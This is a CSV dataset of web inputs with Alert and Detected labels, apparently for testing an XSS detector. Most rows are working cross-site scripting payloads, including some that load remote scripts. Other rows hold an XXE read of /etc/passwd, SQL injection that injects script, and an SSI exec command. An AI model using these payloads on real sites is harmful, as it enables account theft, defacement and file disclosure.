Payload,Alert,Detected
art=<marquee><h1>XSS by Syst3m Cr4sh</h1></marquee>,False,0
"<style>:target {color: red;}</style><keygen id=x style=""transition:color 10s"" ontransitioncancel=print()></keygen>",False,0
page=search&lang=sv,False,0
http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??,False,0
"<style>:target {color: red;}</style><s id=x style=""transition:color 10s"" ontransitioncancel=print()></s>",False,0
sort='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cmarqu<br/>ee%3EWhiteHat%20Forever%3C/marque%3E&keyword='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cma<br/>rquee%3EWhiteHat%20Forever%3C/marque%3E&category,False,0
file=%22%3E%3Ch1%3EDarkMindZ.com,False,0
tid=senti&lid=es&error=-ERR+Authentication+failed.<br/>%0D%0A=%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E<br/>%3C/iframe%3E,False,0
textQuery=%27%22%3E%3Ch1%3ERubberDuck%3C%2Fh1%3E%3Cbr%3E%3Cbr%3E<br/>%3Cmarquee%3EWhiteHat+Forever%3C%2Fmarque%3E&hitsPerPage=20,False,0
search_=%3E%3E%3Cmarquee%3E%3Ch6%3EYAY+INTERNET+SECU<br/>RITY+BY+CHEROKEE+WARRIOR%3C%2Fh6%3E%3C%2Fmarquee%3E&psearchtype=,False,0
act=visu,False,0
ie=UTF-8&ps=10&np=1&fm=off&q=%22%3E%3Cmarquee%3EDEFACED%20BY%20SPONSFULL&<br/>cl=4&button=%E7%AB%8B%E5%8D%B3%E6%90%9C%E7%B4%A2,False,0
<? echo('<scr)';,False,0
URL=xssed.com,False,0
usearch.p_mode=Advanced%22%3E%3Ciframe%20src%20=%22http://br<br/>enn0.wordpress.com%22%3E,False,0
seg=RES&hdnPaginaDestinoLogin=%22%3E'%3E%3CSC<br/>RIPT%20SRC=http://vuln.xssed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,False,0
query=%27%22%3E%3Cmarquee%3EXSS%3Ciframe+src%3D%27http%3A%2F%2Fxss<br/>ed.com%27%2F%3E,False,0
id=1&opr=4,False,0
"<div id=""116""><div id=""x"">x</div>",False,0
"<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>",False,0
return=http://xssed.com,False,0
criteria=%3Ciframe+src%3Dhttp%3A%2F%2Fuber0n.darkillusi<br/>on.org%2Fxsspage.htm%3E&x=0&y=0&searchtype=site,False,0
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;,False,0
"document.getElementsByClassName("""").length",False,0
onDragEnd,False,0
<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>,False,0
s=42eedc100199b35438b3c403e97292e5,False,2
s=42eedc100199b35438b3c403e97292e5,False,0
bannerid=1442&zoneid=81&source=&dest=http%3A%2F%2Fwww.r3t.n<br/>3t.nl,False,0
pesquisar=%3E%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
"<;LINK REL="";stylesheet""; HREF="";http://ha.ckers.org/xss.css"";>;",False,0
-->,False,0
"verFicha='%20or%20'x'='x&template_ficha=<br><font+si<br/>ze=""20""+color=""RED"">HUNTING-SECURITY-BUGS!</font><marquee>www.nullcode.com.ar</marquee><br>&btnG.x=1<br/>8&btnG.y=8&btnG=GO&output=xml_no_dtd&sort=date:D:L:d1&site=nasa_collection&ie=UTF-8&oe=UTF-8&client=<br/>nas_production&proxystylesheet=nas_production&actionType=searchIndex&numgm=12",False,0
searchfor='><marquee>Testicles was here</marquee>&search=search,False,0
"<div style=""background:url(AnonKryptiQuz5.svg)"">PRESS ENTER</div>//[""'`-->]]>]</div>",False,0
msgn=%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
id=9016239%22%3E%3Ciframe%20src=http://xssed.com%3E,False,0
"<img src='vbscript:msgbox(""crosssitescripting"")'>",False,0
Bill_Number=%3Ciframe+src=http://google.com%3E%3E&image.x=<br/>0&image.y=0,False,0
">""<div style=""behaviour: url([link to code]);"">",False,0
Submit1.x=0&Submit1.y=0&Submit1=Search&UserTe<br/>xt=%22%3E%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E,False,0
en=youtube&q=csrf%22%3E%3Ciframe%20src=http://xssed.com%3E,False,0
onControlSelect,False,0
</HTML>,False,0
http://www.g<br/>oogle.fr,False,0
"k=<iframe%20src=""http://www.xssed.com/archive/author=TurKP<br/>oweR/"">",False,0
<style>@import'http://ha.ckers.org/xss.css';</style>,False,0
"profile_cell_number="">test&agreed=&username=""></a><marquee>t<br/>est<!--",False,0
msg='%22%3E%3Ciframe%20src=http://ombreetlumiere.wow.free.fr/forum/i<br/>ndex.php/%3E,False,0
login=funradio&nick=%22%3E%3Cmarquee%3EDEFACED%20B<br/>Y%20SPONSFULL%3C/marquee%3E,False,0
setTimeout(,False,0
q=%22%3E%3Clink%20href=http://starext.by.ru/css.css%20type=text<br/>/css%20rel=stylesheet%3E,False,0
option=com_content&task=view&id=54&Itemid=187=%22%3E%3Ciframe%20sr<br/>c=http://www.google.com/%20width=866%20height=450%3E%3C/iframe%3E,False,0
option=com_content&user_rating=1&submit_vote=1&task=vote&pop=0&Ite<br/>mid=10&cid=1&url=http://vuln.xssed.net/thirdparty/scripts/python5.html,False,0
onpointerover,False,0
cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][<br/>][][][][][][][]=%3Cscript%20src=http://hiphopshare.xm.com/xss.js,False,0
c=176060&p=irol-newsSearchResult&t=Search&control_ir-finan<br/>cialnewsradioon=&control_ir-financialnewsradiooff=&control_ir-financialnewshidden=&control_ir-financ<br/>ialnewsdescr=&control_ir-financialnewscheckbox=&control_alertsjs=&control_ir-secradioon=&control_ir-<br/>secradiooff=&control_ir-secdescr=&control_ir-rptradioon=&control_ir-rptradiooff=&control_ir-rptdescr<br/>=&control_ir-quoteradioon=&control_ir-quoteradiooff=&control_ir-quotedescr=&control_ir-quotecheckbox<br/>=&control_ir-presentationradioon=&control_ir-presentationradiooff=&control_ir-presentationdescr=&con<br/>trol_ir-newsradioon=&control_ir-newsradiooff=&control_ir-newsdescr=&control_ir-mediaradioon=&control<br/>_ir-mediaradiooff=&control_ir-mediadescr=&control_ir-governanceradioon=&control_ir-governanceradioof<br/>f=&control_ir-governancedescr=&control_ir-eventradioon=&control_ir-eventradiooff=&control_ir-eventde<br/>scr=&control_ir-eodsecradioon=&control_ir-eodsecradiooff=&control_ir-eodsecdescr=&control_ir-eodsecc<br/>heckbox=&control_alertzip=&control_alerttitle=&control_alertstate=&control_alertphone=&control_alert<br/>mname=&control_alertlname=&control_alertfname=&control_alertfax=&control_alertextension=&control_ale<br/>rtcountry=&control_alertcompany=&control_alertcity=&control_alertaddr2=&control_alertaddr1=,False,0
"<style>:target {color: red;}</style><nav id=x style=""transition:color 10s"" ontransitioncancel=print()></nav>",False,0
"<style>:target {color: red;}</style><summary id=x style=""transition:color 10s"" ontransitioncancel=print()></summary>",False,0
option=com_content&user_rating=1&submit_vote=index2<br/>.php?option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1<br/>&url=http://xssed.com,False,0
vln=6,False,0
lid=9&tid=0&f_user=&six=&f_email==%22%3E%3Ch1%3ENull%20Code<br/>%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
s=c%27%22%3E%3Ch1%3Etest,False,0
s=%22%3E%3Ciframe%20src=%22http://xss<br/>ed.com%22%3E,False,0
kw=%27%22%3E%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3Ecueballr%3C%2Fstro<br/>ng%3E%3C%2Fh1%3E%3C%2Fmarquee%3E&search=Go,False,0
c_id=35&c_parentid=22&c_rootid=%20}%3C/style%3E%3Cscri<br/>pt%3Ea=eval;b=alert;a(b(/XSS/.source));%3C/script%3E%3CMARQUEE%20BGCOLOR=%22RED%22%3E%3CH1%3EXSS%20b<br/>y%20Xylitol%3C/H1%3E%3C/MARQUEE%3E,False,0
module=htp.tdir&op=doSearch&profile=LuceneSearch&hint_channel=1&hint<br/>_visibility=1000&query=%22%3E%3Cimg+src%3D%22http%3A%2F%2Fimg96.imageshack.us%2Fimg96%2F8009%2Fxssks<br/>5.jpg%22%3E,False,0
Reflect.set.call`${location}${'href'}${name}`,False,0
ID=913&URL=http://vuln.xssed.net/thirdparty/scripts/python5.h<br/>tml,False,0
"movie_id=""/><iframe src=""http://xssed.com""></iframe>",False,0
dn=cnomy.com&pi<br/>d=1POSD3EUD&sp=2&pt=2&vid=1187662333_1X03X1415327935&rpt=2&kt=1,False,0
action=%22%3E'%3E%3CSCRIP<br/>T%20SRC=http://vuln.xssed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,False,0
idtier=376368,False,0
cid=102605003&csite=MyNet&clickurl=www.theshockboy.tr.cx,False,0
id=66&L=13&frameurl=http%3A%2F%2Fwww.xssed.com,False,0
searchString=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+by+ironzorg<br/>%3C%2Fh1%3E%3C%2Fmarquee%3E&page=espn,False,0
&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;,False,0
<img/src/onerror=alert//&NewLine;(2)>,False,0
bannerID=50&zoneid=1&s&zoneid=41&source=&dest=http://seym<br/>en.org,False,0
"<template match=""/"">",False,0
skin=%22%3E%3Ch1%3EDarkMindZ%3C/h1%3E,False,0
onKeyUp,False,0
u=http://xssed.com,False,0
"article_id=-99999+union+all+select+1,0x3c73637269707420737263<br/>3d22687474703a2f2f66726565776562732e636f6d2f736b756e6b663030742f582e6a73223e3c2f7363726970743e,3,4,5<br/>,6,7,8--",False,0
[1].find(confirm),False,0
"frm_id=-3879+and%201=0+union%20select%201,2,3,char(6<br/>0,115,99,114,105,112,116,62,97,108,101,114,116,40,39,101,122,105,107,102,98,61,97,108,101,109,39,41,<br/>60,47,115,99,114,105,112,116,62),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",False,0
page=search&stage=1,False,0
"<style>:target {color: red;}</style><dl id=x style=""transition:color 10s"" ontransitioncancel=print()></dl>",False,0
kw=%22%3E%3Ciframe%20src=%22xssed.org%22%3E&type=product,False,0
KONTO=%22%3E%3Ciframe%20src=http://www.google.de<br/>%3E,False,0
return_to=http://www.bing.com,False,0
.a=i&.pa=add&.pid=3&.p=X19zaG9ydF9fZm9vDmJhcgxpbnRsBXVzBHBhc<br/>nRuZXIFDG4aNjA5MRV0F2EFbho2OTAwNhV0F2EEdwZ3BW4GQzACFXQXYxZuFzkzMTA5BHcGbgVuBkMwAQwBDHN0eWxlATA5MjgwN<br/>SBibDM=%20&.done=http://vuln.xssed.net/thirdparty/scripts/python5.html,False,0
CAMEFROM=MLBWHITESOX-HOMEPAGE&GOTO=http://uber0n.darkil<br/>lusion.org/xsspage.htm,False,0
q=%22%3E%25%3Ch1%3ENude+Massage+Florida%3C/h1%3E%3CIFRAME%20src=//s<br/>ezejc.info/1%3E,False,0
href=http://www.theshockboy.tr.cx?ocid=<br/>MSNHP,False,0
si=0.566224865098702,False,0
<STYLE>@import'%(css)s';</STYLE>,False,0
Owner=delo,False,0
"<iframe src=data:text/html,<iframe src=""data:text/html;base64,PD8+PD8+TT9MSz9KSyNAJDpMQCNKXkBePHNjcmlwdD5hbGVydCgnQml0QmFyZyA6KScpOzwvc2NyaXB0Pgo="">",False,0
&#x03c,False,0
oaparams=2__bannerid=14__zoneid=3__source=%7B<br/>obfs%3A%7D__cb=8a365e2233__oadest=http://insecurity.ro,False,0
pageName=&url=http://xssed.com,False,0
option=com_chanlist,False,0
pcode=%22%3E%3Ccenter%3E%3Ciframe%20src=%22http://xssed.com<br/>%22%3E%3C/center%3E,False,0
"_pageid=80,1526537&_dad=portal&_schema=PORTAL",False,0
l_id=en,False,0
nats=%22%3E%3Ciframe%20src=htt<br/>p://pc-kopat.us/hacked/%3E,False,0
http://seymen.org,False,0
"”&amp;amp;amp;amp;gt;&amp;amp;amp;amp;lt;svg onload=alert&amp;amp;amp;amp;amp;#0000000040""1"")&amp;amp;amp;amp;gt;",False,0
SID=P5D917E666E1F450288DB1A56986414E361BA6D5F<br/>D93D47E3BCA1D6873D7ADDD1DF08FF8D171E42C&lang=1,False,0
"<style>:target {transform: rotate(180deg);}</style><dir id=x style=""transition:transform 2s"" ontransitionrun=print()></dir>",False,0
"<div id=""61""><div  style=""\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;"">XXX</div>//[""'`-->]]>]</div>",False,0
<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;,False,0
img=%22%3E%3Ciframe%20src=http://www.xssed.com/%3E,False,0
"pub=http://www.google.com?+&redir=%27%3E%3Cscr<br/>ipt%3Ewindow.location=location.search.substring(5,28).concat(document.domain)%3C/script%3E&ad=g235e2<br/>0051011164320",False,0
name=Downloads&d_op=search&query=,False,0
"<style>:target {color: red;}</style><center id=x style=""transition:color 10s"" ontransitioncancel=print()></center>",False,0
act=confirm,False,0
http://with.gseshop.co.kr/jsp/jseis_withLGeshop.jsp?me<br/>dia=PP&gourl=http://xssed.com,False,0
"action=""><h1>WHK<br><iframe src=http://xssed.com>&lang=es&bg=es",False,0
ciid=32261&tid=3472&URL=http://www.theshockboy.tr.cx,False,0
Lang='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3C<br/>marquee%3EWhiteHat%20Forever%3C/marquee%3E,False,0
onbeforescriptexecute,False,0
search_query=%22%3E%3Cimg+src%3Dhttp%3A%2F%2F<br/>img257.imageshack.us%2Fimg257%2F3733%2F77822687.png%3E%3C%22&filter=All&horror=movies&page=1&search=<br/>Search,False,0
f=http://www.xssed.com,False,0
"';a=prompt,a()//",False,0
bFlag=%22%3E%3Ciframe%20src=http://www.ther<br/>egister.co.uk/2009/04/21/zango/%20width=640%20height=480%3E,False,0
"<style>:target {color: red;}</style><dir id=x style=""transition:color 10s"" ontransitioncancel=print()></dir>",False,0
"""><body/oNpagEshoW=(confirm)(document.domain)>",False,0
"<style>:target {color: red;}</style><rb id=x style=""transition:color 10s"" ontransitioncancel=print()></rb>",False,0
ph=buscador,False,0
catid=Others,False,0
"a=s&l=1&u=1&t=1&sfield=>""><iframe<br/>src=""http://xssed.com"">",False,0
cerca=%22%3E%3Cimg+src%3D%22http%3A%2F%2Fimg96.imageshack.us%2Fimg<br/>96%2F8009%2Fxssks5.jpg%22%3E&search_submit.x=5&search_submit.y=8,False,0
secgoback=xss.com,False,0
op=perundangan&type=00&subtype=01&tahun=httpFrom=%22%3E%3CSCRIP<br/>T%20SRC=http://dalex.co.tv/x.txt%3E%3C/SCRIPT%3E,False,0
"id=&cid=18&cart_id=20080401034331&sid=""></a><iframe<br/>src=http://www.google.com></iframe><",False,0
nats=%22%3E%3Ciframe%20src=http://hypnozhack<br/>.org/hacked/%3E,False,0
Type=&ArticleID=&ArticleLanguage=&Product=&Categor<br/>y=%3E%3Cmarquee%3E%3Ch1%3EDaiMon%20HACKER%3C/h1%3E%3C/marquee%3E,False,0
"<head><style type=""text/css"">@font-face {font-family: y; src: url(""font.svg#x"") format(""svg"");} body {font: 100px ""y"";}</style></head>",False,0
pagename=%3Ctitle%3Eprincss%20-xss%3C/titl<br/>e%3E%3C/title%3E%3Cp%20align=center%3E%3Cimg%20border=0%20src=http://alexzelder.files.wordpress.com/<br/>2007/02/tux.png%20width=291%20height=356%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3Cfont%20face=Verda<br/>na%20size=7%3Eprincss%20-%20xss%20%3C/font%3E%3C/b%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3Cfont%20<br/>face=Verdana%20size=7%3E%3Ca%20href=http://www.hslteam.org/foro%3E%3Cfont%20color=,False,0
kategori=xssed<hr><br><H1>XSSED by SPYRO KiD</h1><a<br/>href=http://spyrozone.net><font color=red size=5>WWW.SPYROZONE.NET</font></a><br>~ The newbie<br/>Hackers spirit station!<br><br><br><br><noscript>,False,0
lid=es&tid=modern_blue&f_user=&six=&f_email==%22%3E<br/>%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
"SRC=""test.xml"" ID=I",False,0
&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;,False,0
"fld1=""><iframe src=""http://xssed.com"">",False,0
q=%22%3E%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E&sourceq=%24{<br/>sourceq}&hl=Y&template=%2Fsearch%2Findex_refine2.html&searchview=d2&c=d2&changequery=1&GO=,False,0
lid=de&tid=modern_blue&f_user=&six=&f_email==%22%3E%3Ch1%3ENull%20Co<br/>de%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
"<;A HREF="";http://0102.0146.0007.00000223/"";>;XSS<;/A>;",False,0
jumpTo=http://google.com,False,0
nombre=%3Ch1%3EXSS%21%3C%2Fh1%3E&enviado=Buscar,False,0
SID=--%3E%3Cfont%20size='48'%20color='blue'%3E%20XSS%3C/font<br/>%3E,False,0
searchword=%3Ciframe%20src=%22http://download.mvcloob.co<br/>m/DefacedByIHZ-Team.Com.png%22%3E,False,0
onBlur,False,0
page=http://www.toradiun.com/,False,0
"<style>:target {transform: rotate(180deg);}</style><big id=x style=""transition:transform 2s"" ontransitionrun=print()></big>",False,0
"<style>:target {color: red;}</style><picture id=x style=""transition:color 10s"" ontransitioncancel=print()></picture>",False,0
1script3document.vulnerable=true;1/script3,False,0
txtrecherche=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20<br/>by%20ironzorg%3C/h1%3E%3C/marquee%3E,False,0
top['al\145rt'](1),False,0
"”&amp;amp;gt;&amp;amp;lt;svg onload=alert&amp;amp;amp;#0000000040""1"")&amp;amp;gt;",False,0
"<style>:target {color: red;}</style><legend id=x style=""transition:color 10s"" ontransitioncancel=print()></legend>",False,0
"</form>//[""'`-->]]>]</div>",False,0
"""><sVg%2fonload%3dalert%2ebind%28%29%281%29%20class%3dRahul-Dh>",False,0
"<xml:namespace prefix=""t"">",False,0
"last_name=""><iframe<br/>src=http://google.com>&Action=Search%20Database",False,0
search=%22%3E%3Ch1%3EHacked+By+Dialogitec+ImeCiQ%3C%2Fh1%3E&ty<br/>pe=6&select=6&x=0&y=0,False,0
"""><script src=//brutelogic.com.br&sol;1.js&num;",False,0
option=com_content&user_rating=1&submit_vote=index2<br/>.php?option=com_content&user_rating=1&submit_vote=x&task=vote&pop=0&Itemid=10&cid=1&url=http://xssed<br/>.com,False,0
status=4&title=%3Ciframe%20src=http://www.google.com%3E%3C/<br/>iframe%3E,False,0
usr='%22%3E%3Ciframe%20src=http://pc-kopat.us/hacked/%3E,False,0
ShopCD=74&PrdKey=00857012329&Url=http://kusomiso.com,False,0
"<style>:target {transform: rotate(180deg);}</style><audio id=x style=""transition:transform 2s"" ontransitionrun=print()></audio>",False,0
x000003C,False,0
</svg:mask>,False,0
/*${/*/;{/**/(alert)(1)}//><Base/Href=//google.com\76-->,False,0
btnI&q=site:http://www.cyber-warrior.org/,False,0
q=%3Ch1%3E%3Cp+align%3Dcenter%3E%3Cfont+color%3Dgreen%3EHAC<br/>KED%21%3Cmarquee%3E%3C%2Ffont%3E%3Cplaintext%3E&x=37&y=16&pagina=1&navegadorQuery=&start=0&related=t<br/>rue&site=&o=&t=&view=&idCanal=&nomeCanal=&totalRegistrosFast=&navegadorName=&navegadorDataIni=&naveg<br/>adorDataFin=&totalResultadosGoogle=7,False,0
search=+%22%3E%3Cimg+src%3Dhttp%3A%2F%2Fi48.tinypic.com%2Fdw5dkz.png%3E<br/>%3C%2Fimg%3E%3C%22,False,0
onResume,False,0
q=%27%22%3E%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3Ecueballr%3C%2F<br/>strong%3E%3C%2Fh1%3E%3C%2Fmarquee%3E&r1=s&r2=s&r3=s&Submit=Search%21,False,0
for (i=1;i<6;i++) {,False,0
"<style>:target {color: red;}</style><template id=x style=""transition:color 10s"" ontransitioncancel=print()></template>",False,0
file=http://freshmeat.net,False,0
&#X3c,False,0
rubrika=1%22%3E%3Ciframe%20src=http://xssed.com%3E%3C/iframe%3E,False,0
doc_n<br/>ame=http://xssed.com,False,0
"g'""></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250",False,0
"alert;pg(""XSS"")",False,0
id=%22%3E%3Ch1%3E%3Cmarquee%3EXSS%3C/marquee%3E,False,0
option=com_content&user_rating=1&submit_vote=index2.php?option=<br/>com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http://<br/>www.xssed.com,False,0
Textarea=<h1>Hacked by Janizary Er Meydani Tim</h1>,False,0
keyword=%27%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fxssed.co<br/>m%3E&Search.x=0&Search.y=0,False,0
&lt;HTML xmlns:xss&gt;,False,0
cx=016943048450198213849%3Ag5w-iybhah8&cof=FORID%3A11&q=<br/>%3E%3E%3Cmarquee%3E%3Ch1%3EYAY+INTERNET+SECURITY+BY+CHEROKEE+WARRIOR%3C%2Fh1%3E%3C%2Fmarquee%3E,False,0
s=1169536581265&p=</title><iframe+src=http://google.com>,False,0
pt=2&vid=1190263928_2X03X<br/>224694944&rpt=1&kt=1,False,0
"<style>:target {color: red;}</style><object id=x style=""transition:color 10s"" ontransitioncancel=print()></object>",False,0
whois_nic=%3Cbr%3EHI+XSSed.com!%3Cbr%3E%3Ciframe%20s<br/>rc=http://xssed.com%3E&x=20&y=7&type=domain,False,0
type=search&cn=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fgoogle.com%3E,False,0
REF='><iframe src=http://google.com>,False,0
<![endif]-->,False,0
error=<marquee><img%20src=http://i22.photobucket.com/albums/b346/a429MyS<br/>pace/Owned/owned-shark.jpg>,False,0
lid=de&tid=modern_blue&f_user=&six=&f_email==%22%3E%3Ch1%3EN<br/>ull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
option=com_content&user_rating=1&submit_vote=index2.php?option=c<br/>om_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http://x<br/>ssed.com/,False,0
&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;,False,0
"<style>:target {color: red;}</style><style id=x style=""transition:color 10s"" ontransitioncancel=print()></style>",False,0
targetURL=http://anticipate.free.fr,False,0
p=%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironzorg%3C/h1%3E%3C/marquee%3E,False,0
login-success_url=%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
keywords=%3CIFRAME%20src=%22http://www.ogm.g<br/>ov.tr/m.htm%22%20width=800%20height=500%20marginwidth=0%20marginheight=0%20hspace=0%20vspace=0%20scr<br/>olling=no%20frameborder=0%3E%3C/IFRAME%3E,False,0
src=http://google.com,False,0
lang='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cm<br/>arquee%3EWhiteHat%20Forever%3C/marquee%3E,False,0
s=%3Ch1%3EHacked+By+Dialogitec+ImeCiQ%3C%2Fh1%3E,False,0
"<iframe/src=""data:text/html; base64 ,pgjvzhkgb25sb2fkpwfszxj0kdeppg=="">",False,0
pagina=http://xssed.com,False,0
q=%22%3E%3C/div%3E%3CSC%20R<br/>IPT%20SRC=ttp://ha.ckers.org/xss.js%3E%3C/SCRIPT%3E,False,0
dest=http%3A%2F%2Fwww.xssed.com,False,0
&#x0003c,False,0
Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser,False,0
Url=http://www.xssed.com,False,0
"<!--#exec cmd=""/bin/echo 'IPT SRC=http://.rocks/.js>",False,0
"<layer id=xss src=""http://ha.ckers.org/scriptlet.html""></layer>",False,0
url=02_blanc_nathalie&name=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ir<br/>onzorg%3C/h1%3E%3C/marquee%3E,False,0
id=1456'%3E%22%3E%3Ciframe%20src=http://kusomiso.com/xss.ht<br/>ml%20%3C,False,0
"<style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>//[""'`-->]]>]</div>",False,0
gamename=%3Cimg%20src=%22http://i44.tinypic.com/5ohy7o.png%22<br/>%3E?,False,0
USERNAME=borkbork&Password=borkbork&NEXTURL=http://www.owasp.or<br/>g/index.php/Open_redirect?,False,0
oldrefid='>a</a><iframe+src=http://google.com>,False,0
action=url&goto=uber0n.darkillusion.org/xsspage.htm&osCsid=ab5f<br/>f110cbdb09c0e6d2a7f43a7ede8b,False,0
tb_id=19&tb_adi=Fiyat%20&,False,0
"<A HREF=""//google""></A>",False,0
StartRow=1&criteria=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fw<br/>ww.baseportal.com%2Fbaseportal%2Fbankphish%2F_XSS%3E%3C%2Fiframe%3E&FileType=1&MaxRows=10,False,0
pt=2&sp=2&vid=1197336355_1X03X16<br/>75824570&rpt=2&kt=1,False,0
url=http://bit.ly/inbQKv,False,0
website=www.xssed.com,False,0
h=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironzorg%3C/h1%3E%3C/marquee%3E,False,0
seg=hm,False,0
""" on<embed>click=""a=al<embed>ert,a(cookie)",False,0
aid=1215,False,0
"<style>:target {color: red;}</style><q id=x style=""transition:color 10s"" ontransitioncancel=print()></q>",False,0
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo>&xee;</foo>",False,0
path=http://google.com,False,0
013371337;ext=<img/src/onerror=import('//domain/')>,False,0
"<style>:target {transform: rotate(180deg);}</style><u id=x style=""transition:transform 2s"" ontransitionrun=print()></u>",False,0
k=%22%3E%3Cmarquee%3EDEFACED%20BY%20SPONSFULL%3C%2Fmarquee%3E&ti<br/>d=1&type=%E7%94%B5%E5%BD%B1&submit=%E6%90%9C%E7%B4%A2,False,0
RedirectURL=http://xssed.com,False,0
page=answerlink&url=http://insecurity.ro,False,0
q=%3Ciframe%20height=400%20width=1050%20src=%22http://w<br/>ww.presszone.org%22%3E,False,0
"lang=en""><iframe/src=""http://xssed.com"">",False,0
p=search,False,0
kl=msg%3Ch1%3EHacked%20By%20TreX%3C/h1%3E,False,0
search=%22%3E%3Ciframe%20src=%22http://brenn0.wordpress.com%22%3E,False,0
op=profile.display&profileid=210100,False,0
message=%22%3E%3Ch1%3EBy%20St@rExT,False,0
"a=alert,a(1)",False,0
"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">AnonKryptiQuz</A>",False,0
"<embed src=""http://vulnerability-lab.com/crosssitescripting.swf"" allowscriptaccess=""always""></embed>",False,0
ak=CGIB-4000-1000-ZP234&rd=http://kusomiso.com,False,0
-->{},False,0
modul=servicebox&teaser=alle_Services&target=http://xssed.c<br/>om,False,0
